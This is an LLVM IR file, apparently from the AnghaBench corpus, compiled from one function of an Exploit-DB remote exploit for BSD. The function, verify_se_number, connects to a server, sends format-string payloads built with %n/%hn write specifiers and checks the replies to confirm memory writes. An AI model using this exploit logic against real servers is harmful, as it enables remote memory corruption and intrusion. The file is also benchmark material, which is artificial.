; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/bsd/remote/extr_432.c_verify_se_number.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/bsd/remote/extr_432.c_verify_se_number.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BIGBUF = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [7 x i8] c"sm00ny\00", align 1
@.str.1 = private unnamed_addr constant [20 x i8] c"%%%uu%%%u$hn%%%u$hn\00", align 1
@JUNK = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [14 x i8] c"%%%u$n%%%u$hn\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @verify_se_number(i32 %0, i64 %1, i32 %2, i8* %3, i32 %4) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i64, align 8
  %14 = alloca i64, align 8
  %15 = alloca i64, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i64 %1, i64* %8, align 8
  store i32 %2, i32* %9, align 4
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  %20 = load i32, i32* @BIGBUF, align 4
  %21 = zext i32 %20 to i64
  %22 = call i8* @llvm.stacksave()
  store i8* %22, i8** %12, align 8
  %23 = alloca i8, i64 %21, align 16
  store i64 %21, i64* %13, align 8
  %24 = load i32, i32* @BIGBUF, align 4
  %25 = zext i32 %24 to i64
  %26 = alloca i8, i64 %25, align 16
  store i64 %25, i64* %14, align 8
  %27 = load i32, i32* @BIGBUF, align 4
  %28 = zext i32 %27 to i64
  %29 = alloca i8, i64 %28, align 16
  store i64 %28, i64* %15, align 8
  %30 = load i8*, i8** %10, align 8
  %31 = load i32, i32* %11, align 4
  %32 = call i32 @connect_to(i8* %30, i32 %31)
  store i32 %32, i32* %18, align 4
  %33 = trunc i64 %28 to i32
  %34 = call i32 @memset(i8* %29, i32 0, i32 %33)
  %35 = load i32, i32* %18, align 4
  %36 = trunc i64 %28 to i32
  %37 = call i32 @recv(i32 %35, i8* %29, i32 %36, i32 0)
  store i32 %37, i32* %17, align 4
  %38 = call i32 (i8*, i8*, ...) @sprintf(i8* %26, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0))
  %39 = load i64, i64* %8, align 8
  %40 = and i64 %39, 65535
  %41 = load i32, i32* @JUNK, align 4
  %42 = sext i32 %41 to i64
  %43 = sub i64 %40, %42
  %44 = load i32, i32* %9, align 4
  %45 = load i32, i32* %7, align 4
  %46 = call i32 (i8*, i8*, ...) @sprintf(i8* %23, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.1, i64 0, i64 0), i64 %43, i32 %44, i32 %45)
  %47 = call i8* @get_request(i8* %23, i8* %26)
  store i8* %47, i8** %16, align 8
  %48 = load i32, i32* %18, align 4
  %49 = load i8*, i8** %16, align 8
  %50 = call i32 @send_data(i32 %48, i8* %49)
  %51 = trunc i64 %28 to i32
  %52 = call i32 @memset(i8* %29, i32 0, i32 %51)
  %53 = load i32, i32* %18, align 4
  %54 = trunc i64 %28 to i32
  %55 = call i32 @recv(i32 %53, i8* %29, i32 %54, i32 0)
  store i32 %55, i32* %17, align 4
  %56 = load i32, i32* %18, align 4
  %57 = call i32 @close_socket(i32 %56)
  %58 = load i32, i32* %17, align 4
  %59 = icmp sle i32 %58, 0
  br i1 %59, label %60, label %61

60:                                               ; preds = %5
  store i32 0, i32* %6, align 4
  store i32 1, i32* %19, align 4
  br label %89

61:                                               ; preds = %5
  %62 = load i8*, i8** %10, align 8
  %63 = load i32, i32* %11, align 4
  %64 = call i32 @connect_to(i8* %62, i32 %63)
  store i32 %64, i32* %18, align 4
  %65 = trunc i64 %28 to i32
  %66 = call i32 @memset(i8* %29, i32 0, i32 %65)
  %67 = load i32, i32* %18, align 4
  %68 = trunc i64 %28 to i32
  %69 = call i32 @recv(i32 %67, i8* %29, i32 %68, i32 0)
  store i32 %69, i32* %17, align 4
  %70 = call i32 (i8*, i8*, ...) @sprintf(i8* %26, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0))
  %71 = load i32, i32* %9, align 4
  %72 = load i32, i32* %7, align 4
  %73 = call i32 (i8*, i8*, ...) @sprintf(i8* %23, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.2, i64 0, i64 0), i32 %71, i32 %72)
  %74 = call i8* @get_request(i8* %23, i8* %26)
  store i8* %74, i8** %16, align 8
  %75 = load i32, i32* %18, align 4
  %76 = load i8*, i8** %16, align 8
  %77 = call i32 @send_data(i32 %75, i8* %76)
  %78 = trunc i64 %28 to i32
  %79 = call i32 @memset(i8* %29, i32 0, i32 %78)
  %80 = load i32, i32* %18, align 4
  %81 = trunc i64 %28 to i32
  %82 = call i32 @recv(i32 %80, i8* %29, i32 %81, i32 0)
  store i32 %82, i32* %17, align 4
  %83 = load i32, i32* %18, align 4
  %84 = call i32 @close_socket(i32 %83)
  %85 = load i32, i32* %17, align 4
  %86 = icmp sgt i32 %85, 0
  br i1 %86, label %87, label %88

87:                                               ; preds = %61
  store i32 0, i32* %6, align 4
  store i32 1, i32* %19, align 4
  br label %89

88:                                               ; preds = %61
  store i32 1, i32* %6, align 4
  store i32 1, i32* %19, align 4
  br label %89

89:                                               ; preds = %88, %87, %60
  %90 = load i8*, i8** %12, align 8
  call void @llvm.stackrestore(i8* %90)
  %91 = load i32, i32* %6, align 4
  ret i32 %91
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @connect_to(i8*, i32) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @recv(i32, i8*, i32, i32) #2

declare dso_local i32 @sprintf(i8*, i8*, ...) #2

declare dso_local i8* @get_request(i8*, i8*) #2

declare dso_local i32 @send_data(i32, i8*) #2

declare dso_local i32 @close_socket(i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
